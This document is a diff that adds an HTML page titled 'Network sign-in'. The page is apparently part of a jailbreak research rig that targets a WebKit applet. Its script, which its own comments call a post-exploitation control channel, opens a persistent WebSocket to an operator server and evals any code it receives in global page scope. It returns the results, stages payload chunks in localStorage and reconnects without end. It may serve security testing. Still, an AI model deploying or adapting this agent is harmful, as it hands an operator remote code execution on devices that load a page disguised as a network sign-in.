@@ -1,0 +1,473 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Network sign-in</title>
+<style>
+  /* Self-contained: no external assets ever leave this page. Same dark,
+     large-type card as the other rig pages. */
+  html, body { margin: 0; padding: 0; background: #101318; color: #e8eaf0;
+               font-family: sans-serif; }
+  #rig-card { max-width: 900px; margin: 24px auto; padding: 20px 24px;
+              background: #1a1f2b; border: 1px solid #2c3446; border-radius: 10px; }
+  #rig-card h1 { font-size: 24px; margin: 0 0 4px 0; }
+  #rig-card h2 { font-size: 14px; font-weight: normal; color: #8f9ab3;
+                 margin: 0 0 16px 0; }
+  #rig-state { display: inline-block; padding: 2px 10px; border-radius: 6px;
+               font-size: 14px; background: #3a4460; }
+  #rig-state.up { background: #2e6b3a; }
+  #rig-state.down { background: #7a2e35; }
+  table { width: 100%; border-collapse: collapse; font-size: 17px; }
+  td { padding: 5px 6px; border-bottom: 1px solid #262d3d; vertical-align: top; }
+  td.k { color: #9fb0d8; white-space: nowrap; width: 40%; }
+  td.v { word-break: break-all; font-family: monospace; font-size: 15px; }
+  .note { color: #8f9ab3; font-size: 13px; margin-top: 14px; }
+</style>
+</head>
+<body>
+<div id="rig-card">
+  <h1>Network sign-in</h1>
+  <h2>Eval-RPC agent &mdash; BarbarismJB webkit-rig wsagent (persistent
+      WebSocket control channel; reconnects forever, heartbeats every 10s)</h2>
+  <div id="rig-state">BOOT</div>
+  <table id="rig-rows">
+    <tr><td class="k">user agent</td><td class="v" id="rig-ua">probing&hellip;</td></tr>
+    <tr><td class="k">page url</td><td class="v" id="rig-url">&nbsp;</td></tr>
+    <tr><td class="k">ws url</td><td class="v" id="rig-wsurl">&nbsp;</td></tr>
+    <tr><td class="k">connection</td><td class="v" id="rig-conn">connecting&hellip;</td></tr>
+    <tr><td class="k">uptime / heartbeat</td><td class="v" id="rig-up">pending</td></tr>
+    <tr><td class="k">commands (sent / received)</td><td class="v" id="rig-cmds">0 / 0</td></tr>
+    <tr><td class="k">last command</td><td class="v" id="rig-last">&nbsp;</td></tr>
+    <tr><td class="k">last error</td><td class="v" id="rig-err">&nbsp;</td></tr>
+    <tr><td class="k">telemetry</td><td class="v" id="rig-post">pending</td></tr>
+  </table>
+  <div class="note">Keep this page open (or hidden -- the agent survives
+      applet idle via heartbeats). Built-ins: ping, caps, ls-storage,
+      storage.get/set/del &lt;key&gt; [value]; anything else is eval'd on
+      the console. Page marker wsagent (see docs/RIG.md).</div>
+</div>
+<noscript><div style="color:#e8eaf0;padding:20px">
+  JavaScript did not run: the applet blocked scripting or the page did not
+  load. Record this -- it is a negative result for the agent.</div></noscript>
+<script>
+/* BarbarismJB webkit-rig wsagent page: persistent WebSocket eval-RPC agent.
+ *
+ * The post-exploitation control channel for the applet: connect to the
+ * rig's /ws endpoint (role=agent), then loop {id, code} -> eval ->
+ * {id, ok, result|error, elapsed}. Commands arrive from an operator
+ * console (role=console) or the rig's curl-driven /rig/ws/send. Built-in
+ * command set: ping, caps, ls-storage, storage.get/set/del (localStorage
+ * staging with size report); anything else is eval in page scope, where
+ * window.__agent also exposes the staging helpers for staged payload work.
+ *
+ * Survival: heartbeat every 10s (server acks), receive watchdog at 75s,
+ * auto-reconnect with capped backoff, immediate beat on visibility change
+ * (applet idle must never silently kill the channel), and a self-healing
+ * interval that re-dials if the socket died with no retry scheduled.
+ *
+ * Boot/connect/disconnect lines POST to /report so the bench watcher
+ * journals channel liveness (page marker "wsagent").
+ *
+ * ES5-only like the other rig pages. The server templates
+ * {{RIG_HOST}}/{{RIG_PORT}}; unfilled tokens fall back to location.host.
+ */
+
+var RIG_SCHEMA = 1;
+var RIG_PAGE = "wsagent";
+var RIG_HOST = "{{RIG_HOST}}";
+var RIG_PORT = "{{RIG_PORT}}";
+var RIG_FILLED = RIG_HOST.indexOf("{{") !== 0;
+var RIG_BASE = RIG_FILLED
+    ? "http://" + RIG_HOST + ":" + RIG_PORT
+    : (location.protocol + "//" + location.host);
+var WS_URL = RIG_BASE.replace(/^http/, "ws") + "/ws?role=agent";
+
+var HB_INTERVAL_MS = 10000;          /* heartbeat cadence */
+var RX_WATCHDOG_MS = 75000;          /* no inbound in this window -> redial */
+var BACKOFF_MS = [1000, 2000, 4000, 8000, 16000, 30000];
+var RESULT_CAP = 65536;              /* chars of a serialized eval result */
+
+var R = {
+  schema: RIG_SCHEMA, page: RIG_PAGE, phase: "boot", seq: 0,
+  startedAt: (new Date()).toISOString(),
+  rig: { templated: RIG_FILLED ? (RIG_HOST + ":" + RIG_PORT) : null,
+         base: RIG_BASE, pageHost: location.host },
+  location: { url: location.href, referrer: document.referrer || null },
+  env: { userAgent: navigator.userAgent },
+  channel: { wsUrl: WS_URL, attempts: 0, connects: 0, disconnects: 0,
+             heartbeats: 0, sent: 0, received: 0, lastError: null,
+             lastCommand: null },
+  errors: []
+};
+
+var sock = null;
+var backoffIdx = 0;
+var hbTimer = null, rxWatchdog = null, retryTimer = null;
+var lastRxAt = 0;
+
+function fail(stage, e) {
+  var msg = String(e && e.message ? e.message : e);
+  if (R.errors.length < 20) { R.errors.push({ stage: stage, error: msg }); }
+  R.channel.lastError = msg;
+  setRow("rig-err", msg.slice(0, 200));
+}
+function $(id) { return document.getElementById(id); }
+function setRow(id, text) { try { $(id).textContent = String(text); } catch (e) {} }
+function setState(text, cls) {
+  try { var el = $("rig-state"); el.textContent = text;
+        el.className = cls || ""; } catch (e) {}
+}
+function nowMs() {
+  try {
+    if (typeof performance !== "undefined" && performance &&
+        typeof performance.now === "function") {
+      return performance.now();
+    }
+  } catch (e) {}
+  return Date.now();
+}
+function uptimeMs() { return Math.round(nowMs()); }
+function uptimeStr() {
+  var s = Math.floor((Date.now() - Date.parse(R.startedAt)) / 1000);
+  var m = Math.floor(s / 60); s %= 60;
+  var h = Math.floor(m / 60); m %= 60;
+  return (h ? h + "h" : "") + m + "m" + s + "s";
+}
+
+/* ------------------------------------------------ telemetry (best-effort) */
+function sendJson(url, obj, cb) {
+  var payload;
+  try { payload = JSON.stringify(obj); }
+  catch (e) { cb(false); return; }
+  if (typeof fetch === "function") {
+    fetch(url, { method: "POST",
+                 headers: { "Content-Type": "application/json" },
+                 body: payload })
+      .then(function (res) { cb(!!res && res.ok); })
+      .catch(function () { cb(false); });
+    return;
+  }
+  cb(false);
+}
+function postReport(phase, note) {
+  R.phase = phase;
+  R.seq++;
+  R.note = note || null;
+  sendJson(RIG_BASE + "/report", R, function (ok) {
+    setRow("rig-post", (ok ? "sent" : "FAILED") + " (" + phase + " #" + R.seq + ")");
+  });
+}
+
+/* ------------------------------------------ localStorage staging helpers */
+/* Exposed globally as window.__agent so eval'd commands can call them and
+ * the rig can stage payload chunks across reconnects. */
+var STAGE_PREFIX = "wsagent-stage:";
+function storageInfo() {
+  var out = { available: false, entries: 0, stagedBytes: 0, totalBytes: 0 };
+  try {
+    if (typeof localStorage === "undefined" || !localStorage) { return out; }
+    out.available = true;
+    var i, k, v;
+    for (i = 0; i < localStorage.length; i++) {
+      k = localStorage.key(i);
+      v = localStorage.getItem(k) || "";
+      out.totalBytes += v.length;
+      if (k.indexOf(STAGE_PREFIX) === 0) {
+        out.entries++;
+        out.stagedBytes += v.length;
+      }
+    }
+  } catch (e) { fail("storage.info", e); }
+  return out;
+}
+var __agent = {
+  storage: {
+    get: function (key) {
+      try {
+        var v = localStorage.getItem(STAGE_PREFIX + key);
+        return { ok: v !== null, key: key, size: v === null ? 0 : v.length,
+                 value: v };
+      } catch (e) { return { ok: false, key: key, error: String(e) }; }
+    },
+    set: function (key, value) {
+      try {
+        localStorage.setItem(STAGE_PREFIX + key, String(value));
+        var back = localStorage.getItem(STAGE_PREFIX + key) || "";
+        return { ok: true, key: key, size: back.length,
+                 roundtrip: back.length === String(value).length,
+                 storage: storageInfo() };
+      } catch (e) {
+        return { ok: false, key: key, error: String(e),
+                 storage: storageInfo() };
+      }
+    },
+    del: function (key) {
+      try {
+        localStorage.removeItem(STAGE_PREFIX + key);
+        return { ok: true, key: key, storage: storageInfo() };
+      } catch (e) { return { ok: false, key: key, error: String(e) }; }
+    },
+    ls: function () {
+      var info = storageInfo(), keys = [], i;
+      try {
+        for (i = 0; i < localStorage.length; i++) {
+          var k = localStorage.key(i);
+          keys.push({ key: k, size: (localStorage.getItem(k) || "").length });
+        }
+      } catch (e) { fail("storage.ls", e); }
+      info.keys = keys;
+      return info;
+    }
+  },
+  hb: function () { return heartbeat(); },
+  info: function () { return channelStatus(); }
+};
+try { window.__agent = __agent; } catch (e) {}
+
+/* ------------------------------------------------------- built-in commands */
+function channelStatus() {
+  return {
+    page: "wsagent", up: !!(sock && sock.readyState === 1),
+    readyState: sock ? sock.readyState : -1,
+    wsUrl: WS_URL, uptime: uptimeStr(),
+    connects: R.channel.connects, disconnects: R.channel.disconnects,
+    heartbeats: R.channel.heartbeats, sent: R.channel.sent,
+    received: R.channel.received, lastError: R.channel.lastError
+  };
+}
+function builtinCaps() {
+  var c = {
+    userAgent: navigator.userAgent,
+    language: navigator.language || null,
+    hardwareConcurrency: (typeof navigator.hardwareConcurrency === "number")
+        ? navigator.hardwareConcurrency : null,
+    viewport: { w: window.innerWidth, h: window.innerHeight,
+                dpr: window.devicePixelRatio || null },
+    localStorage: typeof localStorage !== "undefined",
+    WebSocket: typeof WebSocket,
+    Worker: typeof Worker,
+    eval: typeof eval,
+    location: location.href,
+    channel: channelStatus()
+  };
+  return c;
+}
+function runBuiltin(code) {
+  var parts = String(code).split(/\s+/);
+  var cmd = parts[0];
+  if (cmd === "ping") {
+    return { pong: true, ts: Date.now(), uptime: uptimeStr(),
+             sent: R.channel.sent, received: R.channel.received,
+             heartbeats: R.channel.heartbeats };
+  }
+  if (cmd === "caps") { return builtinCaps(); }
+  if (cmd === "ls-storage") { return __agent.storage.ls(); }
+  if (cmd === "storage.get") {
+    if (!parts[1]) { throw new Error("usage: storage.get <key>"); }
+    return __agent.storage.get(parts[1]);
+  }
+  if (cmd === "storage.set") {
+    if (!parts[1]) { throw new Error("usage: storage.set <key> <value>"); }
+    var rest = String(code).slice(cmd.length + parts[1].length + 2);
+    return __agent.storage.set(parts[1], rest);
+  }
+  if (cmd === "storage.del") {
+    if (!parts[1]) { throw new Error("usage: storage.del <key>"); }
+    return __agent.storage.del(parts[1]);
+  }
+  return null;                       /* not a builtin -> eval */
+}
+function serializeResult(r) {
+  if (r === undefined) { return "undefined"; }
+  try {
+    var s = JSON.stringify(r);
+    return (typeof s === "string") ? s : String(r);
+  } catch (e) {
+    try { return String(r); } catch (e2) { return "(unserializable)"; }
+  }
+}
+function executeCommand(msg) {
+  var id = (msg && msg.id !== undefined) ? msg.id : null;
+  var code = (msg && typeof msg.code === "string") ? msg.code : "";
+  var t0 = nowMs(), reply;
+  R.channel.lastCommand = code.slice(0, 160);
+  setRow("rig-last", R.channel.lastCommand);
+  try {
+    var result;
+    var builtin = runBuiltin(code);
+    if (builtin !== null && builtin !== undefined) {
+      result = builtin;
+    } else {
+      /* eval in GLOBAL scope so commands see the page's real globals
+       * (window.eval == indirect eval == global scope) */
+      var geval = window.eval || eval;
+      result = geval(code);
+      if (result && typeof result.then === "function") {
+        result = "[object Promise] (async results not awaited)";
+      }
+    }
+    var serialized = serializeResult(result);
+    if (serialized.length > RESULT_CAP) {
+      serialized = serialized.slice(0, RESULT_CAP) +
+          "…(truncated " + (serialized.length - RESULT_CAP) + " chars)";
+    }
+    reply = { id: id, ok: true, result: serialized,
+              elapsed: Math.round((nowMs() - t0) * 1000) / 1000 };
+    /* keep the result as a real JSON value when it round-trips, else the
+     * raw string -- both are one field on the wire */
+    try {
+      var round = JSON.parse(serialized);
+      if (round !== undefined) { reply.result = round; }
+    } catch (e) {}
+  } catch (e) {
+    reply = { id: id, ok: false,
+              error: String(e && e.message ? e.message : e).slice(0, 2000),
+              elapsed: Math.round((nowMs() - t0) * 1000) / 1000 };
+  }
+  return reply;
+}
+
+/* ------------------------------------------------------------- transport */
+function sendRaw(obj) {
+  if (!sock || sock.readyState !== 1) { return false; }
+  try { sock.send(JSON.stringify(obj)); R.channel.sent++; return true; }
+  catch (e) { fail("ws.send", e); return false; }
+}
+function heartbeat() {
+  var ok = sendRaw({ hb: 1, seq: R.channel.heartbeats, ts: Date.now(),
+                     uptime: uptimeStr(),
+                     sent: R.channel.sent, received: R.channel.received });
+  if (ok) { R.channel.heartbeats++; }
+  setRow("rig-up", uptimeStr() + " / " + R.channel.heartbeats + " beats");
+  return ok;
+}
+function armRxWatchdog() {
+  if (rxWatchdog) { clearTimeout(rxWatchdog); }
+  rxWatchdog = setTimeout(function () {
+    if (!sock || sock.readyState !== 1) { return; }
+    fail("ws.rx-watchdog", "no inbound traffic in " + RX_WATCHDOG_MS + "ms");
+    try { sock.close(4000, "rx-watchdog"); } catch (e) {}
+    /* onclose fires the reconnect path */
+  }, RX_WATCHDOG_MS);
+}
+function noteRx() {
+  lastRxAt = Date.now();
+  armRxWatchdog();
+}
+function connect() {
+  if (typeof WebSocket !== "function") {
+    setState("NO WEBSOCKET", "down");
+    setRow("rig-conn", "WebSocket unsupported in this applet");
+    postReport("boot", "no-websocket-transport");
+    return;
+  }
+  if (sock && (sock.readyState === 0 || sock.readyState === 1)) { return; }
+  R.channel.attempts++;
+  setState("CONNECTING", "");
+  setRow("rig-conn", "dialing (attempt " + R.channel.attempts + ")…");
+  var s;
+  try { s = new WebSocket(WS_URL); }
+  catch (e) {
+    fail("ws.constructor", e);
+    scheduleReconnect();
+    return;
+  }
+  sock = s;
+  s.onopen = function () {
+    backoffIdx = 0;
+    R.channel.connects++;
+    setState("CONNECTED", "up");
+    setRow("rig-conn", "open (connect #" + R.channel.connects + ")");
+    noteRx();
+    heartbeat();
+    if (hbTimer) { clearInterval(hbTimer); }
+    hbTimer = setInterval(function () {
+      if (!sock || sock.readyState !== 1) { return; }
+      if (!heartbeat()) { try { sock.close(4001, "hb-send-failed"); } catch (e) {} }
+    }, HB_INTERVAL_MS);
+    postReport("connect", "connect #" + R.channel.connects);
+  };
+  s.onmessage = function (ev) {
+    R.channel.received++;
+    noteRx();
+    setRow("rig-cmds", R.channel.received + " / " + R.channel.sent);
+    var msg = null;
+    try { msg = JSON.parse(String(ev.data)); } catch (e) {
+      fail("ws.parse", "non-JSON frame: " + String(ev.data).slice(0, 80));
+      return;
+    }
+    if (!msg || typeof msg !== "object") { return; }
+    if (msg.t === "welcome" || msg.t === "hb-ack") { return; }
+    if (msg.id === undefined && msg.code === undefined) { return; }
+    /* {id, code} -> run -> {id, ok, result|error, elapsed} */
+    var reply = executeCommand(msg);
+    if (!sendRaw(reply)) {
+      fail("ws.reply", "reply undeliverable (socket closed mid-command)");
+    }
+  };
+  s.onclose = function (ev) {
+    R.channel.disconnects++;
+    if (hbTimer) { clearInterval(hbTimer); hbTimer = null; }
+    if (rxWatchdog) { clearTimeout(rxWatchdog); rxWatchdog = null; }
+    setState("RECONNECTING", "down");
+    setRow("rig-conn", "closed (code " + (ev && ev.code) + ", disconnect #" +
+           R.channel.disconnects + ")");
+    postReport("disconnect", "close code " + (ev && ev.code));
+    scheduleReconnect();
+  };
+  s.onerror = function () {
+    /* onclose follows; nothing to do but surface it */
+    setRow("rig-conn", "ws error (see last error)");
+  };
+}
+function scheduleReconnect() {
+  if (retryTimer) { return; }         /* one retry in flight, always */
+  var delay = BACKOFF_MS[Math.min(backoffIdx, BACKOFF_MS.length - 1)];
+  backoffIdx = Math.min(backoffIdx + 1, BACKOFF_MS.length - 1);
+  setRow("rig-conn", "retry in " + delay + "ms");
+  retryTimer = setTimeout(function () {
+    retryTimer = null;
+    connect();
+  }, delay);
+}
+
+/* ------------------------------------------------------ idle survival */
+try {
+  document.addEventListener("visibilitychange", function () {
+    /* an immediate beat when the applet re-shows us; if the socket died
+     * while idle, the beat fails and the reconnect path takes over */
+    if (!document.hidden && sock && sock.readyState === 1) { heartbeat(); }
+    if (!document.hidden && (!sock || sock.readyState > 1) && !retryTimer) {
+      backoffIdx = 0;
+      connect();
+    }
+  });
+} catch (e) {}
+/* self-heal: a socket that died without firing onclose gets re-dialled */
+setInterval(function () {
+  if (sock && sock.readyState === 3 && !retryTimer) { scheduleReconnect(); }
+  if (!sock && !retryTimer && typeof WebSocket === "function") {
+    scheduleReconnect();
+  }
+}, 5000);
+
+/* ------------------------------------------------------------- driver */
+function run() {
+  setRow("rig-url", location.href);
+  setRow("rig-wsurl", WS_URL);
+  setRow("rig-ua", navigator.userAgent || "(no navigator.userAgent)");
+  postReport("boot", "wsagent page loaded");
+  connect();
+}
+
+try {
+  run();
+} catch (e) {
+  fail("driver", e);
+  setState("AGENT CRASHED", "down");
+  try { postReport("crash", String(e && e.message ? e.message : e)); } catch (e2) {}
+}
+</script>
+</body>
+</html>
